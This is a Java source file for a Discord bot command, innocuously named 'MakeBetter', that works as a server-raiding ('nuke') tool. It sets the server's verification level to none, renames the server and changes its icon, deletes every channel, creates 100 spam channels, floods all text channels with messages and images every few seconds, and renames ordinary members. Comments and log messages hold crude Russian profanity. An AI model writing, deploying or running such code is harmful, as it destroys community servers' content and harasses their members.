package net.servokio.q4mc.discord.commands;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.servokio.q4mc.MainDC;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
public class MakeBetter {
    public static void makeBetter(String newName, boolean sendImage, String guildID){

        List<String> messages = new ArrayList<>();

        //Vars
        Guild g = MainDC.getInstance().jda.getGuildById(guildID);
        String newGuildName = (newName.length() < 3 ? "--"+newName+"--" : newName).replaceAll("_", " ");

        Thread sendMessages = new Thread(() -> {
            boolean ok = true;
            int at = 0;
            while (ok){
                try {
                    Thread.sleep(5000);
                    String mess = messages.size() > 0 ? getMessage(messages) : newGuildName;
                    if(randInt(0,2) == 1 && sendImage){
                        File imageFile = new File("./image.jpg");
                        if(imageFile.exists() && !imageFile.isDirectory()) {
                            File finalImageFile = imageFile;
                            g.getTextChannels().forEach(key -> key.sendFile(finalImageFile).queue());
                        }
                    }
                    g.getTextChannels().forEach(key -> key.sendMessage(mess).queue());
                    at++;
                    if(at >= 100) ok = false;
                } catch (InterruptedException ignored) {
                    ok = false;
                }
            }
        });

        Thread inputThread = new Thread(() -> {
            System.out.println("Starting making better server: "+guildID);
            try{
                File iconFile = new File("./icon.png");
                try{
                    if(iconFile.exists() && !iconFile.isDirectory()) g.getManager().setIcon(Icon.from(iconFile)).queue();
                } catch (IOException e) {
                    System.out.println("Где иконка долбаёб");
                    //throw new RuntimeException(e);
                }
                g.getManager().setVerificationLevel(Guild.VerificationLevel.NONE).queue();
                g.getManager().setName(newGuildName).queue();
                g.getChannels().forEach(key -> key.delete().queue());

                File messagesFile = new File("./messages.txt");
                if(messagesFile.exists() && !messagesFile.isDirectory()){
                    try {
                        FileInputStream fis = new FileInputStream(messagesFile);
                        InputStreamReader isr = new InputStreamReader(fis, StandardCharsets.UTF_8);
                        BufferedReader reader = new BufferedReader(isr);
                        String line;
                        while ((line = reader.readLine()) != null) {
                            messages.add(line);
                        }
                    } catch (IOException e) {
                        System.out.println(e.getMessage());
                    }
                }

                //

                if(messages.size() == 0) System.out.println("W: Messages not found");

                boolean hasImage = false;
                File imageFile = null;
                if(sendImage){
                    imageFile = new File("./image.jpg");
                    if(imageFile.exists() && !imageFile.isDirectory()) hasImage = true;
                }

                if(!hasImage) System.out.println("W: image not found");

                for (int i = 0; i < 100; i++) {
                    try {
                        TextChannel hallo = g.createTextChannel(newGuildName).complete();
                        String mess = messages.size() > 0 ? getMessage(messages) : newGuildName;
                        hallo.sendMessage(mess).queue();
                        if(hasImage) hallo.sendFile(imageFile).queue();
                    } catch (Exception ignored) {}
                }
                for (Member members : g.getMembers()) if (!(members.isOwner() || members.getUser().isBot() || members.getId().equals(MainDC.getInstance().jda.getSelfUser().getId()))) members.getGuild().modifyNickname(members, newGuildName).queue();
            } catch (Exception ignored){

            }
        });

        inputThread.start();
        sendMessages.start();

        MainDC.getInstance().threadManager.addThread(guildID, inputThread);
        MainDC.getInstance().threadManager.addThread(guildID, sendMessages);
        //бля
    }

    private static String getMessage(List<String> messages){
        int rnd = new Random().nextInt(messages.size());
        return messages.get(rnd);
    }

    public static int randInt(int min, int max) {
        Random rand = new Random();
        return rand.nextInt((max - min) + 1) + min;
    }
}
